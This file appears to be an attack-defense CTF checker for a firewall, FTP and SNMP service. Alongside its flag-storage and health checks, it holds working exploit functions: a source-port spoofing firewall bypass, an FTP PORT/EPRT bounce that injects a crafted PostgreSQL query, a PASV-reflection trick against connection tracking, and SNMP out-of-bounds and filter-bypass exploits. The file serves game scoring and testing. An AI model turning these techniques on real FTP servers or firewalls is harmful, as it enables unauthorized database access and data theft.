                        logger.info(f'Weird MLSD listing {listing!r} (expected tree {tree!r}, as user {username})')
                        raise MumbleException('Weird response from MLSD')
                    if isinstance(item, dict):
                        if not is_directory:
                            logger.info(f'{name} should have been a directory, but was a file (in MLSD listing {listing!r}, as user {username})')
                            raise MumbleException('Incorrect entry type on FTP server')
                        await conn.cwd(name)
                        await recursive_check(item)
                        await conn.cdup()
                    elif isinstance(item, bytes):
                        if is_directory:
                            logger.info(f'{name} should have been a file, but was a directory (in MLSD listing {listing!r}, as user {username})')
                            raise MumbleException('Incorrect entry type on FTP server')
                        channel = await vpn_data_channel(conn, generator.ftp_mode(ip_version), vpn)
                        try:
                            content = await conn.retr(channel, name)
                        except ftp.UnexpectedFTPResponse:
                            logger.info(f'Failed to retrieve file {name} from FTP server (for MLSD listing {listing!r}, as user {username})')
                            raise MumbleException('Missing file on FTP server')
                        if content != item:
                            logger.info(f'Expected {item!r} in {name} but received {content!r} (as user {username})')
                            raise MumbleException('Incorrect file on FTP server')
                    else:
                        raise InternalErrorException('Invalid directory tree')

            await recursive_check(tree)
        finally:
            await conn.quit(immediately=True)


@utils.generate_variants(checker.exploit, {
    0: (..., 4, 21),
    1: (..., 4, 80),
    2: (..., 6, 21),
    3: (..., 6, 80),
})
@exception_guard
async def exploit_source_port(task: ExploitCheckerTaskMessage,
                              logger: LoggerAdapter,
                              client: AsyncClient,
                              searcher: FlagSearcher,
                              ip_version: types.IPVersion,
                              source_port: int):
    '''
    Exploits the lack of connection tracking in the default filter to directly connect to the
    database.
    '''
    if not task.attack_info:
        raise InternalErrorException('Missing attack info')
    target_user = task.attack_info

    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()

    async with await create_vpn(task, username, password, logger) as vpn:
        localhost = '127.0.0.1' if ip_version == 4 else '::1'
        localhost_url = '127.0.0.1' if ip_version == 4 else '[::1]'
        for attempt in range(exploit_retries):
            try:
                async with proxy.RewritingProxy(vpn, (localhost, 0), (Service.DB.ip(ip_version), Service.DB.port), (None, source_port), None) as vpn_proxy:
                    async with await psycopg.AsyncConnection.connect(f'postgresql://anonymous:anonymous@{localhost_url}:{vpn_proxy.port}/firewall?sslmode=prefer') as db:
                        async with db.cursor() as cursor:
                            await cursor.execute('SELECT time, packet FROM fetch_user_log(%s)', (target_user,))
                            async for row in cursor:
                                _, packet = tuple(row)
                                flag = searcher.search_flag(packet)
                                if flag is not None:
                                    return flag
                            return
            except psycopg.errors.IdleInTransactionSessionTimeout:
                if attempt == exploit_retries - 1:
                    raise
                else:
                    logger.exception('SQL query failed (idle in transaction timeout), retrying')
            except psycopg.errors.OperationalError:
                if attempt == exploit_retries - 1:
                    raise
                else:
                    logger.exception('SQL query failed (operational error), retrying')


@utils.generate_variants(checker.exploit, {
    4: (..., 4, ftp.TransferMode.PORT),
    5: (..., 4, ftp.TransferMode.EPRT),
    6: (..., 6, ftp.TransferMode.EPRT),
})
@exception_guard
async def exploit_ftp_active_mode(task: ExploitCheckerTaskMessage,
                                  logger: LoggerAdapter,
                                  client: AsyncClient,
                                  searcher: FlagSearcher,
                                  ip_version: types.IPVersion,
                                  target_mode: ftp.TransferMode):
    '''
    Exploits missing checks on FTP PORT/EPRT connections to make the FTP server connect directly
    to the database and copy log messages (= flags) to our user's message log.
    '''
    if not task.attack_info:
        raise InternalErrorException('Missing attack info')
    target_user = task.attack_info

    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()

    filename = generator.filename()

    escaped_user = postgres.pgsql_quote_ident(username)
    escaped_target = postgres.pgsql_quote_ident(target_user)
    exploit = postgres.pgsql_oneshot_query(
        utils.merge_lines(f'''
            BEGIN;
            INSERT INTO log.{escaped_user} (time, packet) SELECT time, packet FROM log.{escaped_target};
            COMMIT;
        '''),
        user='anonymous',
        password=None,
        database='firewall',
    ).ljust(16384, b'\0')

    async with await create_vpn(task, username, password, logger) as vpn:
        conn = await ftp.FTP(await vpn.open_connection(Service.FTP.ip(ip_version), Service.FTP.port), logger)
        try:
            await conn.user(username)
            await conn.pass_(password)
            await conn.type('I')

            match ip_version:
                case 4: mode = ftp.TransferMode.PASV
                case 6: mode = ftp.TransferMode.EPSV

            channel = await conn.data_channel(mode, vpn.open_connection)
            await conn.stor(channel, filename, exploit)
            try:
                match target_mode:
                    case ftp.TransferMode.PORT: await conn.port(Service.DB.ipv4, Service.DB.port)
                    case ftp.TransferMode.EPRT: await conn.eprt(Service.DB.ip(ip_version), Service.DB.port)
                await conn.retr(ftp.no_channel(), filename, check_result=False)
            finally:
                await conn.dele(filename)
        finally:
            await conn.quit(immediately=True)

    async for packet in frontend_client.dropped_packets():
        flag = searcher.search_flag(packet)
        if flag is not None:
            return flag


@utils.generate_variants(checker.exploit, {
    7:  (..., 'MDTM {pasv_message}',                550), # Will error (path does not exist), but reflect the path
    8:  (..., 'MFMT 19700101000000 {pasv_message}', 550), # Will error (path does not exist), but reflect the path
    9:  (..., 'SIZE {pasv_message}',                550), # Will error (path does not exist), but reflect the path
    10: (..., 'TYPE {pasv_message}',                504), # Will error (invalid type), but reflect the argument
})
@exception_guard
async def exploit_pasv_filter(task: ExploitCheckerTaskMessage,
                              logger: LoggerAdapter,
                              client: AsyncClient,
                              searcher: FlagSearcher,
                              ftp_command: str,
                              expected_ftp_result: int):
    '''
    Exploits missing checks on FTP PASV responses in connection tracking to allow
    direct connections to the database.
    '''
    if not task.attack_info:
        raise InternalErrorException('Missing attack info')
    target_user = task.attack_info

    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()

    pasv_ip = str(Service.DB.ipv4).replace('.', ',')
    pasv_port = f'{Service.DB.port >> 8},{Service.DB.port & 0xff}'
    pasv_message = f'227 ^w^ ({pasv_ip},{pasv_port})'

    async with await create_vpn(task, username, password, logger) as vpn:
        conn = await ftp.FTP(await vpn.open_connection(Service.FTP.ipv4, Service.FTP.port), logger)

        try:
            await conn.user(username)
            await conn.pass_(password)
            await conn.type('I')

            for attempt in range(exploit_retries):
                try:
                    await conn.generic_command(
                        ftp_command.format(pasv_message=pasv_message),
                        expected_ftp_result
                    )

                    # You can also use MKD to create a directory, and the response (257) will reflect the path.
                    # But that requires cleanup later, so we don't have it in the list above.
                    #
                    # Creating a file with this name and using STAT (expecting 213), or a directory and using CWD
                    # (expecting 250), or either and using MLST (expecting 250) will also reflect the path name,
                    # but this takes multiple commands and cleanup.

                    # We need to proxy the requests, unfortunately, because we cannot set fwmark on the DB
                    # connection before it actually makes a connection attempt (which will of course fail).
                    async with proxy.Proxy(vpn, ('127.0.0.1', 0), (Service.DB.ipv4, Service.DB.port)) as vpn_proxy:
                        async with await psycopg.AsyncConnection.connect(f'postgresql://anonymous:anonymous@127.0.0.1:{vpn_proxy.port}/firewall?sslmode=prefer') as db:
                            async with db.cursor() as cursor:
                                await cursor.execute('SELECT time, packet FROM fetch_user_log(%s)', (target_user,))
                                async for row in cursor:
                                    _, packet = tuple(row)
                                    flag = searcher.search_flag(packet)
                                    if flag is not None:
                                        return flag
                                return
                except psycopg.errors.IdleInTransactionSessionTimeout:
                    if attempt == exploit_retries - 1:
                        raise
                    else:
                        logger.exception('SQL query failed (idle in transaction timeout), retrying')
                except psycopg.errors.OperationalError:
                    if attempt == exploit_retries - 1:
                        raise
                    else:
                        logger.exception('SQL query failed (operational error), retrying')
        finally:
            await conn.quit(immediately=True)


@checker.putflag(1)
@exception_guard
async def put_flag_snmp_custom_var(task: PutflagCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter, db: ChainDB) -> str:
    '''Stores a flag in a SNMP agent custom variable'''
    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()

    secret = secrets.token_bytes(8)
    identifier = await frontend_client.snmp_set_var(secret, task.flag.encode())

    await db.set('credentials', (username, password, secret, identifier))
    return identifier.hex()


@checker.getflag(1)
@exception_guard
async def get_flag_snmp_custom_var(task: GetflagCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter, db: ChainDB):
    '''Retrieves a flag from a SNMP agent custom variable'''
    try:
        username, password, secret, identifier = await db.get('credentials')
    except KeyError:
        raise MumbleException('Previous store failed')

    new_user = generator.bit()

    if new_user:
        username = generator.username()
        password = generator.password()

    frontend_client = frontend.FrontendClient(client, logger, username, password)

    if new_user:
        await frontend_client.register()
    else:
        await frontend_client.login()

    if generator.bit():
        value = await frontend_client.snmp_get_var(secret, identifier)
    else:
        value = await snmp.frontend_get_custom(frontend_client, identifier, secret)

    if task.flag.encode() not in value:
        logger.info(f'Retrieved value {value!r} from the SNMP manager, which does not contain the flag')
        raise MumbleException('Flag missing')


@utils.generate_variants(checker.exploit, {
    11: (..., 4),
    12: (..., 6),
})
@exception_guard
async def exploit_snmp_getnext_via_localhost(task: ExploitCheckerTaskMessage,
                                     logger: LoggerAdapter,
                                     client: AsyncClient,
                                     searcher: FlagSearcher,
                                     ip_version: types.IPVersion):
    '''
    Exploit missing check for martian packets to talk directly to the SNMP agent.
    The SNMP agent then allows for reading custom variables without knowing the password
    via getNext requests.
    '''
    if not task.attack_info:
        raise InternalErrorException('Missing attack info')
    try:
        target_identifier = bytes.fromhex(task.attack_info)
    except ValueError:
        # Invalid attack info means it's not for this flag store
        return
    if len(target_identifier) != 8:
        # This is not our attack info
        return

    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()

    async with await create_vpn(task, username, password, logger) as vpn:
        localhost = '127.0.0.1' if ip_version == 4 else '::1'
        with proxy.Rewriter(
            vpn,
            (vpn.ip(ip_version), None),
            (Service.Firewall.ip(ip_version), Service.SNMP.port),
            None,
            (localhost, None),
            {socket.IPPROTO_UDP},
        ):
            connection = await vpn.open_connection(
                Service.Firewall.ip(ip_version),
                Service.SNMP.port,
                socket_type=socket.SOCK_DGRAM,
            )
            try:
                value = await snmp.get_next_custom(connection, target_identifier)
            except (snmp.SNMPExploitException, snmp.SNMPNotFoundException):
                # Do not error on missing identifier - VPN usernames might overlap with
                # the identifier range, so this might just not be a valid target identifier
                # We'll let the test framework treat this as a failed exploit attempt.
                # If it is unable to retrieve the flag with either attack_info, it'll let
                # us know.
                return
            finally:
                _, writer = connection
                writer.close()
                await writer.wait_closed()
            flag = searcher.search_flag(value)
            return flag


@checker.exploit(13)
@exception_guard
async def exploit_snmp_oob_via_manager(task: ExploitCheckerTaskMessage,
                                   logger: LoggerAdapter,
                                   client: AsyncClient,
                                   searcher: FlagSearcher):
    '''
    Exploit an out of bounds read while accessing monitoring values in the SNMP agent.
    The exploit runs via the RAW request in the agent as the monitoring endpoint
    doesn't allowow for out of bounds values to be passed.
    '''
    if not task.attack_info:
        raise InternalErrorException('Missing attack info')
    try:
        target_identifier = bytes.fromhex(task.attack_info)
    except ValueError:
        # Invalid attack info means it's not for this flag store
        return
    if len(target_identifier) != 8:
        # This is not our attack info
        return

    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()

    try:
        value = await snmp.manager_oob_exploit(frontend_client, target_identifier, logger)
    except (snmp.SNMPExploitException, snmp.SNMPNotFoundException):
        return # Do not error on missing identifier (see above)
    flag = searcher.search_flag(value)
    return flag

@checker.exploit(14)
@exception_guard
async def exploit_snmp_getnext_via_manager(task: ExploitCheckerTaskMessage,
                                   logger: LoggerAdapter,
                                   client: AsyncClient,
                                   searcher: FlagSearcher):
    '''
    The frontend checks that raw packets can only contain the GET PDU type.
    But the parsing logic contains a bug that allows a malicious packet to bypass this check.
    This is an exploit to abuse this bug.
    '''
    if not task.attack_info:
        raise InternalErrorException('Missing attack info')
    try:
        target_identifier = bytes.fromhex(task.attack_info)
    except ValueError:
        # Invalid attack info means it's not for this flag store
        return
    if len(target_identifier) != 8:
        # This is not our attack info
        return

    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()

    try:
        value = await snmp.manager_getnext_exploit(frontend_client, target_identifier, logger)
    except (snmp.SNMPExploitException, snmp.SNMPNotFoundException):
        return # Do not error on missing identifier (see above)
    flag = searcher.search_flag(value)
    return flag


@checker.putnoise(1)
@exception_guard
async def put_noise_snmp_custom_storage(task: PutnoiseCheckerTaskMessage,
                                        client: AsyncClient,
                                        logger: LoggerAdapter,
                                        db: ChainDB) -> None:
    '''Store noise in the SNMP custom storage'''
    count = generator.number(25, 35)
    credentials = []

    for _ in range(count):
        username = generator.username()
        password = generator.password()
        frontend_client = frontend.FrontendClient(client, logger, username, password)
        await frontend_client.register()

        message = generator.string(1, 87)

        # make sure the encoded message is not too big
        message = message.encode()[:87]

        secret = secrets.token_bytes(8)
        identifier = await frontend_client.snmp_set_var(secret, message)
        credentials.append((username, password, secret, identifier, message))

        await frontend_client.logout()

    await db.set('credentials', (count, credentials))


@checker.getnoise(1)
@exception_guard
async def get_noise_snmp_custom_storage(task: GetnoiseCheckerTaskMessage,
                                        client: AsyncClient,
                                        logger: LoggerAdapter,
                                        db: ChainDB) -> None:
    '''Retrieves noise from the SNMP custom storage'''
    try:
        count, credentials = await db.get('credentials')
    except KeyError:
        raise MumbleException('Previous store failed')

    for credential in credentials:
        username, password, secret, identifier, message = credential

        # don't create many new accounts here
        new_user = generator.bias(0.1)

        if new_user:
            username = generator.username()
            password = generator.password()

        frontend_client = frontend.FrontendClient(client, logger, username, password)

        if new_user:
            await frontend_client.register()
        else:
            await frontend_client.login()

        value = await frontend_client.snmp_get_var(secret, identifier)
        if value != message:
            raise MumbleException('Can\'t retrieve SNMP stored value via get custom value')

        value = await snmp.frontend_get_custom(frontend_client, identifier, secret)
        if value != message:
            raise MumbleException('Can\'t retrieve SNMP stored value via raw get')

        await frontend_client.logout()


@checker.havoc(6)
@exception_guard
async def havoc_snmp_monitoring_init(task: HavocCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter):
    '''Check if the SNMP monitoring init endpoint works'''
    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()
    values = await frontend_client.snmp_get_monitoring_init()
    for label in snmp_monitoring.monitoring_labels:
        if label not in values:
            logger.info(f'Missing SNMP monitoring value {label!r} (received {values!r})')
            raise MumbleException(f'Manager monitoring values is missing "{label}"')


@checker.havoc(7)
@exception_guard
async def havoc_snmp_unspec_msg(task: HavocCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter):
    '''
    Send a slightly out-of-spec SNMP message to make patching harder.
    Normally the community string is a OctetString but netsnmp also accepts Opaque and some other types.
    pysnmp doesn't accept such out-of-spec messages.
    If pysnmp is used to parse SNMP messages in the frontend, it will break, but the agent will be fine.
    '''
    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()
    try:
        await snmp.frontend_get_monitoring(
            frontend_client,
            generator.number(0, len(snmp_monitoring.monitoring_labels)),
            opaque_community=True,
        )
    except Exception as e:
        logger.info('Exception while sending out-of-spec SNMP message', exc_info=e)
        raise e


@utils.generate_variants(checker.havoc, {
    8: (..., False),
    9: (..., True),
})
@exception_guard
async def havoc_snmp_monitoring(task: HavocCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter, user: bool):
    '''Check if the SNMP monitoring values match the expected value'''
    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()

    if user:
        functions = snmp_monitoring.check_functions_user
        decrement = 0.2
    else:
        functions = snmp_monitoring.check_functions
        decrement = 0.1

    # check at least 2 and at most 6 or 11 random values
    # with higher probability to check fewer values
    checks = generator.shuffled(functions)
    probability = 1.0
    for check in checks:
        await check(frontend_client, logger)
        if not generator.bias(probability):
            break
        probability -= decrement


@checker.havoc(10)
@exception_guard
async def havoc_dropped_packets(task: HavocCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter):
    '''
    Check that the number of dropped packets in the SNMP monitoring increases when packets are dropped by the firewall for the user,
    and that they match with the log actually reported in the frontend.
    Incidentally, this also checks that the register-to-read-packet-log workflow works.
    Other checker tasks only read the packet log after login.
    '''
    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()

    check_bytes = generator.bit()
    snmp_key = 'queryDbUserDroppedBytes' if check_bytes else 'queryDbUserDroppedPackets'

    async def check_frontend_packets():
        byte_count = packet_count = 0
        async for packet in frontend_client.dropped_packets():
            byte_count += len(packet)
            packet_count += 1
        return byte_count, packet_count

    initial_dropped_bytes_frontend, initial_dropped_packets_frontend = await check_frontend_packets()
    initial_dropped_frontend = initial_dropped_bytes_frontend if check_bytes else initial_dropped_packets_frontend

    initial_dropped_snmp = await snmp_monitoring.get_value_user(frontend_client, snmp_key)
    if not isinstance(initial_dropped_snmp, int):
        raise MumbleException('Unexpected response from SNMP server')

    # Create dropped packets
    additional_dropped_packets = generator.number(1, 16)
    additional_dropped_bytes = 0
    async with await create_vpn(task, username, password, logger) as vpn_client:
        for _ in range(additional_dropped_packets):
            # Make sure this does not overlap with IPv4/IPv6, i.e. that the first
            # byte's top nibble is not 4 or 6 - otherwise we might accidentally
            # route the data and that would be bad.
            data = generator.flag_prefix() + generator.string(0, 100).encode() + generator.flag_suffix()
            additional_dropped_bytes += len(data)
            await vpn_client.send_raw_packet(data)

        # Give it a little bit of time to actually sync into the database
        # We can make sure that the packets have been processed by sending a valid packet and waiting for a response
        ip_version = secrets.choice(vpn_client.supported_ip_versions())
        conn = await ftp.FTP(await vpn_client.open_connection(Service.FTP.ip(ip_version), Service.FTP.port), logger)
        await conn.quit(immediately=True)
    additional_dropped = additional_dropped_bytes if check_bytes else additional_dropped_packets

    dropped_snmp = await snmp_monitoring.get_value_user(frontend_client, snmp_key)
    if not isinstance(dropped_snmp, int):
        raise MumbleException('Unexpected response from SNMP server')

    dropped_bytes_frontend, dropped_packets_frontend = await check_frontend_packets()
    dropped_frontend = dropped_bytes_frontend if check_bytes else dropped_packets_frontend

    if initial_dropped_frontend <= initial_dropped_snmp < initial_dropped_snmp + additional_dropped <= dropped_snmp <= dropped_frontend:
        # This is the expected order.
        return

    units = 'bytes' if check_bytes else 'packets'
    logger.info(f'Before havoc, the frontend reported {initial_dropped_frontend} dropped {units} and SNMP reported {initial_dropped_snmp} dropped {units}. '
                f'We then dropped {additional_dropped} additional {units}. '
                f'Then, the frontend reported {dropped_frontend} dropped {units} and SNMP reported {dropped_snmp} dropped {units}.')
    raise MumbleException('Did not log all dropped packets')


@checker.test(0)
async def test_speciality_filenames(task: TestCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter):
    '''Tests that we correctly handle all of our specialty file and directory names'''
    username = generator.username()
    password = generator.password()
    frontend_client = frontend.FrontendClient(client, logger, username, password)
    await frontend_client.register()

    async with await create_vpn(task, username, password, logger) as vpn:
        ip_version = secrets.choice(vpn.supported_ip_versions())
        conn = await ftp.FTP(await vpn.open_connection(Service.FTP.ip(ip_version), Service.FTP.port), logger)
        try:
            await conn.user(username)
            await conn.pass_(password)
            await conn.type('I')

            async def test_listings(name: str, type_: typing.Literal['dir', 'file']):
                '''Tests that the file name shows up correctly in various listings'''
                # Test LIST on parent
                mode = generator.ftp_mode(ip_version)
                channel = await vpn_data_channel(conn, mode, vpn)
                listing = await conn.list_(channel)
                if len(listing) != 1:
                    raise ftp.UnexpectedFTPResponse(f'Received LIST listing {listing!r} but expected exactly one entry')
                m = re.fullmatch(r'(drwxr-xr-x|-rw-r--r--)\s*\d+\s*root\s*root\s*\d+\s\S+ \d+ \d+:\d+ ' + re.escape(name), listing[0])
                if m is None:
                    raise ftp.UnexpectedFTPResponse(f'Received incorrect LIST listing entry {listing[0]!r} for {name!r}')

                # Test MLSD on parent
                mode = generator.ftp_mode(ip_version)
                channel = await vpn_data_channel(conn, mode, vpn)
                listing = await conn.mlsd(channel)
                if len(listing) != 1 or name not in listing:
                    raise ftp.UnexpectedFTPResponse(f'Received MLSD listing {listing!r} but expected exactly one entry for {name!r}')
                if listing[name]['type'] != type_:
                    raise ftp.UnexpectedFTPResponse(f'Received MLSD listing {listing!r} with incorrect type for {name!r}')

                # Test NLST on parent
                mode = generator.ftp_mode(ip_version)
                channel = await vpn_data_channel(conn, mode, vpn)
                listing = await conn.nlst(channel)
                if listing != [name]:
                    raise ftp.UnexpectedFTPResponse(f'Received NLST listing {listing!r} but expected exactly one entry for {name!r}')

                # Test MLST
                mode = generator.ftp_mode(ip_version)
                channel = await vpn_data_channel(conn, mode, vpn)
                listing = await conn.mlst(name)
                if listing['type'] != type_:
                    raise ftp.UnexpectedFTPResponse(f'Received MLST listing {listing!r} with incorrect type for {name!r}')

            async def test_filename(name: str):
                '''Tests file upload and download'''
                logger.debug(f'Testing file name {name!r}')
                content = secrets.token_bytes(generator.number(24, 2048))

                # Upload
                mode = generator.ftp_mode(ip_version)
                channel = await vpn_data_channel(conn, mode, vpn)
                await conn.stor(channel, name, content)

                # Listings
                await test_listings(name, 'file')

                # Size
                size = await conn.size(name)
                if size != len(content):
                    raise ftp.UnexpectedFTPResponse(f'Received incorrect SIZE for {name!r}')

                # Download
                mode = generator.ftp_mode(ip_version)
                channel = await vpn_data_channel(conn, mode, vpn)
                if await conn.retr(channel, name) != content:
                    raise ftp.UnexpectedFTPResponse(f'Failed to retrieve stored file {name!r}')

                # Delete
                await conn.dele(name)

            async def test_directory(name: str):
                '''Tests directory operations'''
                logger.debug(f'Testing directory name {name!r}')

                mode = generator.ftp_mode(ip_version)
                await conn.mkd(name)
                await conn.cwd(name)
                await conn.cdup()

                content = secrets.token_bytes(generator.number(24, 2048))
                channel = await vpn_data_channel(conn, mode, vpn)
                await conn.stor(channel, f'{name}/file', content)
                await conn.dele(f'{name}/file')

                await test_listings(name, 'dir')
                await conn.rmd(name)


            for name in suspicious.filenames:
                await test_filename(name)
            for name in suspicious.directories:
                await test_directory(name)
            for name in suspicious.strings:
                if not any(c in name for c in suspicious.unsafe_in_filenames):
                    await test_filename(name)
                    await test_directory(name)
        finally:
            await conn.quit(immediately=True)


if __name__ == '__main__':
    checker.run()
